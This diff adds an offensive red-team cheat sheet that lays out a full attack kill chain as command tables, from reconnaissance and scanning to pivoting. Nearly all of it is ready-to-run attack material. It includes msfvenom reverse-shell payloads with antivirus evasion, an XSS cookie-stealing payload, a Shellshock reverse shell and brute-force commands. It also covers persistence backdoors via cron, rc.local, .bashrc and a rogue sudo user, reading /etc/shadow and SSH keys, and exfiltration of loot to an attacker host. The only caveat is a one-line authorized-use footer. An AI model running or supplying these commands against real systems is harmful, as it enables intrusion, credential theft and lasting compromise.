@@ -1,0 +1,256 @@
+════════════════════════════════════════════════════════════════
+  RED TEAM UNIFIED KILL CHAIN — Tools & Methods Reference
+════════════════════════════════════════════════════════════════
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MODULE 1 — SETUP  (Tool Inventory)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[ CORE ]
+  Tool              Install Command
+  ────────────────  ─────────────────────────────────────────
+  nmap              pkg install nmap
+  msfconsole        pkg install metasploit
+  sqlmap            pkg install sqlmap
+  nc                pkg install netcat-openbsd
+  curl              pkg install curl
+  git               pkg install git
+  python3           pkg install python
+  ssh               pkg install openssh
+  proxychains4      pkg install proxychains-ng
+
+[ RECON / OSINT ]
+  Tool              Install Command
+  ────────────────  ─────────────────────────────────────────
+  subfinder         go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+  dnsrecon          pip install dnsrecon
+  fierce            pip install fierce
+  dnsx              go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+  gau               go install github.com/lc/gau/v2/cmd/gau@latest
+  waybackurls       go install github.com/tomnomnom/waybackurls@latest
+
+[ SCANNING / ENUMERATION ]
+  Tool              Install Command
+  ────────────────  ─────────────────────────────────────────
+  naabu             go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+  httpx             go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+  nuclei            go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+  ffuf              go install github.com/ffuf/ffuf/v2@latest
+  gobuster          pkg install gobuster
+  feroxbuster       pkg install feroxbuster
+  dirb              pkg install dirb
+  nikto             pkg install nikto
+  enum4linux        pkg install enum4linux
+  snmpwalk          pkg install net-snmp
+  sslscan           pkg install sslscan
+
+[ EXPLOITATION / POST ]
+  Tool              Install Command
+  ────────────────  ─────────────────────────────────────────
+  chisel            go install github.com/jpillora/chisel@latest
+
+[ UTILS ]
+  Tool              Install Command
+  ────────────────  ─────────────────────────────────────────
+  termux-open-url   pkg install termux-tools
+  lsof              pkg install lsof
+  wget              pkg install wget
+
+  NOTE: Go tools install to ~/go/bin/
+        Add to PATH: export PATH=$PATH:~/go/bin
+        pip tools:   add --break-system-packages on Termux
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MODULE 2 — RECONNAISSANCE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[ CLI OSINT TOOLS ]
+  #   Tool            Example Command
+  ──  ──────────────  ────────────────────────────────────────
+  1   theHarvester    theHarvester -d <target> -b all
+  2   Subfinder       subfinder -d <target>
+  3   Amass           amass enum -d <target>
+  4   DNSRecon        dnsrecon -d <target>
+  5   Fierce          fierce --domain <target>
+
+[ WEB RESOURCES ]
+  #   Name            URL
+  ──  ──────────────  ────────────────────────────────────────
+  6   Shodan          https://www.shodan.io/search?query=<target>
+  7   WHOIS online    https://who.is/whois/<target>
+  8   DNS Dumpster    https://dnsdumpster.com
+  9   crt.sh certs    https://crt.sh/?q=%.<target>
+  10  VirusTotal      https://www.virustotal.com/gui/domain/<target>
+  11  BGP Toolkit     https://bgp.he.net/dns/<target>
+
+[ DNS / BUILT-IN ]
+  Method            Command
+  ────────────────  ────────────────────────────────────────
+  DNS lookup        nslookup <target>
+  Host lookup       host <target>
+  WHOIS             whois <target>
+  Ping check        ping -c 3 <target>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MODULE 3 — ENUMERATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[ NMAP SCAN MODES ]
+  Mode              Command
+  ────────────────  ────────────────────────────────────────
+  Quick             nmap -sV --open -T4 <target>
+  Full              nmap -sV -p- --open -T4 <target>
+  Stealth           nmap -sS -sV --open -T2 <target>
+
+[ ADDITIONAL ENUMERATION ]
+  #   Method          Command
+  ──  ──────────────  ────────────────────────────────────────
+  1   SMB enum        enum4linux -a <target>
+  2   SNMP walk       snmpwalk -c public -v1 <target>
+  3   Web scan        nikto -h <target>
+  4   Dir brute       gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
+  5   Banner grab     nc -nv <target> 80
+  6   SSL info        sslscan <target>:443
+  7   HTTP HEAD       curl -sI http://<target>
+  8   robots.txt      curl -s http://<target>/robots.txt
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MODULE 4 — PAYLOAD DELIVERY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[ MSFVENOM PAYLOADS ]
+  #   Platform        Command
+  ──  ──────────────  ────────────────────────────────────────
+  1   Linux x86       msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf
+  2   Linux x64       msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf
+  3   Windows x64     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe
+  4   Android APK     msfvenom -p android/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -o shell.apk
+  5   PHP webshell    msfvenom -p php/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw -o shell.php
+  6   Python          msfvenom -p cmd/unix/reverse_python LHOST=<lhost> LPORT=<lport> -f raw
+  7   Bash TCP        bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
+
+[ AV BYPASS ]
+  Method            Command / Note
+  ────────────────  ────────────────────────────────────────
+  Encoder           msfvenom ... --encoder x86/shikata_ga_nai -i 10
+  UPX packer        upx --brute shell.elf
+  Veil-Evasion      Use Veil-Evasion or Shellter for PE injection
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MODULE 5 — EXPLOITATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  #   Type            Command
+  ──  ──────────────  ────────────────────────────────────────
+  1   SQLi            sqlmap -u 'http://<target>/page?id=1' --dbs --batch --level=3 --risk=2
+  2   SSH Brute       hydra -L users.txt -P rockyou.txt ssh://<target> -t 4
+  3   FTP Brute       hydra -L users.txt -P passwords.txt ftp://<target>
+  4   HTTP Brute      hydra -L users.txt -P passwords.txt <target> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
+  5   MSF Handler     use exploit/multi/handler
+  -   XSS             <script>fetch('http://<lhost>/?c='+document.cookie)</script>
+  -   LFI             http://<target>/page?file=../../../../etc/passwd
+  -   RCE             curl http://<target>/cmd?c=id
+  -   Shellshock      curl -H 'User-Agent: () {:;}; /bin/bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' http://<target>/cgi-bin/test.cgi
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MODULE 6 — INITIAL ACCESS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  #   Method          Command
+  ──  ──────────────  ────────────────────────────────────────
+  1   Netcat          nc -lvnp <lport>
+  2   MSF Handler     use exploit/multi/handler
+                      set PAYLOAD linux/x86/meterpreter/reverse_tcp
+                      set LHOST <lhost> / set LPORT <lport>
+                      set ExitOnSession false
+                      exploit -j -z
+  3   Python shell    python3 -c "import socket,subprocess,os;s=socket.socket();
+                      s.connect(('<lhost>',<lport>));os.dup2(s.fileno(),0);
+                      os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+                      subprocess.call(['/bin/sh','-i'])"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MODULE 7 — PRIVILEGE ESCALATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[ LOCAL CHECKS (run on target) ]
+  Check             Command
+  ────────────────  ────────────────────────────────────────
+  Current user      id && whoami
+  Sudo rights       sudo -l 2>/dev/null
+  SUID binaries     find / -perm -u=s -type f 2>/dev/null | head -20
+  Writable /etc     find /etc -writable -type f 2>/dev/null | head -10
+  Crontab           cat /etc/crontab 2>/dev/null
+  Kernel version    uname -a
+  OS info           cat /etc/os-release 2>/dev/null
+  Open ports        ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
+
+[ AUTOMATED TOOLS ]
+  #   Tool            Command
+  ──  ──────────────  ────────────────────────────────────────
+  1   SUID bins       find / -perm -u=s -type f 2>/dev/null
+  2   Sudo -l         sudo -l
+  3   Cron jobs       cat /etc/crontab 2>/dev/null
+  4   Kernel          uname -a
+  5   LinPEAS         curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+  6   WinPEAS         certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe winpeas.exe
+  7   GTFOBins        https://gtfobins.github.io
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MODULE 8 — PERSISTENCE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  #   Method          Command
+  ──  ──────────────  ────────────────────────────────────────
+  1   Cron shell      (crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/<lhost>/<lport> 0>&1') | crontab -
+  2   SSH key inject  mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '<PUB_KEY>' >> ~/.ssh/authorized_keys
+  3   Rogue user      useradd -m -s /bin/bash -G sudo backdoor && echo 'backdoor:B@ckd00r!' | chpasswd
+  4   rc.local        echo '/bin/bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' >> /etc/rc.local && chmod +x /etc/rc.local
+  5   .bashrc hook    echo 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1 &' >> ~/.bashrc
+  6   Systemd svc     Create /etc/systemd/system/svc.service with reverse shell ExecStart
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MODULE 9 — ASSET COLLECTION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[ LOCAL COLLECTION ]
+  File              Command
+  ────────────────  ────────────────────────────────────────
+  passwd            cat /etc/passwd
+  shadow            cat /etc/shadow
+  hosts             cat /etc/hosts
+  bash history      cat ~/.bash_history
+  env vars          env
+  SSH private key   cat ~/.ssh/id_rsa
+  network info      ip a && ip route
+
+[ EXFILTRATION ]
+  #   Method          Command
+  ──  ──────────────  ────────────────────────────────────────
+  1   Pack loot       tar czf ~/loot.tar.gz <loot_dir>
+  2   curl upload     curl -F 'f=@~/loot.tar.gz' http://<lhost>/upload
+  3   SCP transfer    scp -r <loot_dir> user@<lhost>:~/received/
+  4   HTTP server     python3 -m http.server 8080
+  5   NC send         nc <lhost> 9999 < ~/loot.tar.gz
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MODULE 10 — PIVOTING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  #   Method              Command
+  ──  ──────────────────  ────────────────────────────────────
+  1   SSH SOCKS proxy     ssh -D 9050 -N -f user@<pivot>
+  2   SSH port forward    ssh -L 8080:127.0.0.1:80 user@<pivot>
+  3   SSH reverse tunnel  ssh -R <lport>:127.0.0.1:<lport> user@<lhost>
+  4   Chisel server       chisel server -p 8080 --reverse  (on lhost)
+  5   Chisel client       chisel client <lhost>:8080 R:socks  (on pivot)
+  6   Proxychains scan    proxychains4 nmap -sT -Pn <subnet>
+  7   Pass-the-Hash       pth-winexe -U 'DOMAIN/user%<NTLM_HASH>' //<pivot> cmd.exe
+  8   MSF route           route add <subnet> <session_id>  (in msfconsole)
+  9   Ligolo-ng           ligolo-ng proxy -selfcert
+
+════════════════════════════════════════════════════════════════
+  For authorized penetration testing only.
+  Replace <target>, <lhost>, <lport>, <subnet>, <pivot> with
+  actual values from your session.
+════════════════════════════════════════════════════════════════
